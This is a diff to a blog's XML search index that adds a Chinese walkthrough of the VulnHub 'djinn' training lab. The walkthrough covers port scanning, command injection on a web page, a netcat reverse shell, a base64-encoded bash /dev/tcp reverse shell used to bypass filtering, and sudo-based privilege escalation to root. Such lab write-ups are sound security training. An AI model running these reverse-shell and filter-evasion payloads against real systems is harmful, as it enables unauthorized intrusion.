@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>综合实战第三章-异常端口实战</title>
+      <link href="/2022/05/02/djinn/"/>
+      <url>/2022/05/02/djinn/</url>
+      
+        <content type="html"><![CDATA[<h1 id="综合实战第三章"><a href="#综合实战第三章" class="headerlink" title="综合实战第三章"></a>综合实战第三章</h1><h2 id="异常端口"><a href="#异常端口" class="headerlink" title="异常端口"></a>异常端口</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/entry/djinn-1,397/">https://www.vulnhub.com/entry/djinn-1,397/</a></p><p>攻击机:</p><p>kali 192.168.3.134</p><p>win7 192.168.3.137</p><p>靶机:djinn 192.168.3.171</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先扫描端口</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.171</code></pre><p><img src="/2022/05/02/djinn/image-20220502203117441.png" alt="image-20220502203117441"></p><p>有FTP服务，可以先看看</p><pre class=" language-Linux"><code class="language-Linux">ftp 192.168.3.171anonymous</code></pre><p>里面有三个文件</p><p><img src="/2022/05/02/djinn/image-20220502203424210.png" alt="image-20220502203424210"></p><p>把他们都下载下来</p><pre class=" language-Linux"><code class="language-Linux">get creds.txtget game.txtget message.txt</code></pre><p>把这三个文件都看看有啥东西</p><p>也没啥玩意，先看看7331端口吧</p><p><img src="/2022/05/02/djinn/image-20220503082440871.png" alt="image-20220503082440871"></p><p>先扫描一下</p><pre class=" language-Linux"><code class="language-Linux">gobuster dir -u http://192.168.3.171:7331 -w /usr/share/wordlists/dirb/big.txt</code></pre><p><img src="/2022/05/02/djinn/image-20220503084244876.png" alt="image-20220503084244876"></p><p>扫出来这俩玩意，去看看</p><p>在<code>/wish</code>里看到这个</p><p><img src="/2022/05/02/djinn/image-20220503084428233.png" alt="image-20220503084428233"></p><p>输入id，发现确实会输出，说明有命令执行漏洞</p><p><img src="/2022/05/02/djinn/image-20220503085541127.png" alt="image-20220503085541127"></p><p>那么久可以构造nc</p><pre class=" language-Linux"><code class="language-Linux">nc -e /bin/sh 192.168.3.134 1234</code></pre><p><img src="/2022/05/02/djinn/image-20220503085737059.png" alt="image-20220503085737059"></p><p>说明可能会屏蔽某些字符</p><p>那么用<code>base64</code>加密</p><pre class=" language-Linux"><code class="language-Linux">echo 'bash -i >& /dev/tcp/192.168.3.134/1234 0>&1' | base64</code></pre><p><img src="/2022/05/02/djinn/image-20220503090432300.png" alt="image-20220503090432300"></p><p>然后在命令行中输入</p><pre class=" language-Linux"><code class="language-Linux">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzEyMzQgMD4mMQo= | base64 -d | bash</code></pre><p>nc成功连接</p><p><img src="/2022/05/02/djinn/image-20220503090459398.png" alt="image-20220503090459398"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看一下<code>/etc/passwd</code></p><p><img src="/2022/05/02/djinn/image-20220503090707001.png" alt="image-20220503090707001"></p><p>去看看<code>/home</code></p><p>在<code>nitish</code>里找到一个<code>user.txt</code></p><p>但是没有权限</p><p><img src="/2022/05/02/djinn/image-20220503091156334.png" alt="image-20220503091156334"></p><p>查看一下文件权限</p><pre class=" language-Linux"><code class="language-Linux">ls -la</code></pre><p><img src="/2022/05/02/djinn/image-20220503091221457.png" alt="image-20220503091221457"></p><p>进入<code>.dev</code>目录</p><p>看到creds.txt，里面有账号和密码</p><p><img src="/2022/05/02/djinn/image-20220503091530713.png" alt="image-20220503091530713"></p><p>可以提权</p><p>先打开一个terminal</p><pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'</code></pre><p>然后进入nitish用户</p><pre class=" language-Linux"><code class="language-Linux">su nitish</code></pre><p><img src="/2022/05/02/djinn/image-20220503091833091.png" alt="image-20220503091833091"></p><p>可以去看看user.txt里面有啥玩意了</p><pre class=" language-Linux"><code class="language-Linux">cat user.txt10aay8289ptgguy1pvfa73alzusyyx3c</code></pre><p><img src="/2022/05/02/djinn/image-20220503091921697.png" alt="image-20220503091921697"></p><p>不知道这个是干啥用的，先存起来</p><p>查看别的权限</p><pre class=" language-Linux"><code class="language-Linux">sudo -l</code></pre><p><img src="/2022/05/02/djinn/image-20220503092033691.png" alt="image-20220503092033691"></p><p>看看genie里有啥</p><pre class=" language-Linux"><code class="language-Linux">genie -h</code></pre><p>可以提权到sam这个用户</p><pre class=" language-Linux"><code class="language-Linux">sudo -u sam genie -cmd whoami</code></pre><p><img src="/2022/05/02/djinn/image-20220503092301951.png" alt="image-20220503092301951"></p><p>再看一眼别的权限</p><pre class=" language-Linux"><code class="language-Linux">sudo -l</code></pre><p><img src="/2022/05/02/djinn/image-20220503092344577.png" alt="image-20220503092344577"></p><p>看到有个用root权限的</p><p>在sam文件夹下面有<code>.py</code>文件</p><p>把他传送到本地进行反编译</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer</code></pre><p>在本机</p><pre class=" language-Linux"><code class="language-Linux">wget http://192.168.3.171:8000/.pyc</code></pre><p>进行反编译</p><pre class=" language-Linux"><code class="language-Linux">uncompyle6 -o app.py app.pyc</code></pre><p>编译完之后查看一下</p><p><img src="/2022/05/02/djinn/image-20220503100633448.png" alt="image-20220503100633448"></p><p>根据代码审计</p><p>使用命令</p><pre class=" language-Linux"><code class="language-Linux">sudo -u root /root/lago2num</code></pre><p><img src="/2022/05/02/djinn/image-20220503101232396.png" alt="image-20220503101232396"></p><p>提权到root，结束！</p><p><img src="/2022/05/02/djinn/image-20220503101340126.png" alt="image-20220503101340126"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 靶场练习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> 综合实战 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 靶场练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>综合实战第二章-DC-8</title>
       <link href="/2022/05/02/DC-8/"/>
       <url>/2022/05/02/DC-8/</url>
@@ -607,11 +638,11 @@
       
         <tags>
             
-            <tag> 网络安全 </tag>
-            
             <tag> 环境搭建 </tag>
             
             <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
             
             <tag> CVE </tag>
             
@@ -638,11 +669,11 @@
       
         <tags>
             
-            <tag> 网络安全 </tag>
-            
             <tag> 环境搭建 </tag>
             
             <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
             
             <tag> Apache </tag>
             
@@ -671,9 +702,9 @@
       
         <tags>
             
-            <tag> 网络安全 </tag>
-            
             <tag> 环境搭建 </tag>
+            
+            <tag> 网络安全 </tag>
             
             <tag> Linux </tag>
             
